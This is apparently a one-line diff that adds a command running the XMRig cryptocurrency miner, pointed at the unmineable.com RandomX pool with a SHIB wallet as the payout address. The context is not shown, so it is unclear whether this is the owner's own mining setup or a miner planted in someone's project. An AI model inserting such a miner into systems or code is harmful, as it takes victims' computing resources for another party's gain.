@@ -1,0 +1,1 @@
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xb3243Ee24DaA5D5C551fEcb958D9ab872f6df63C.01 -p x pause
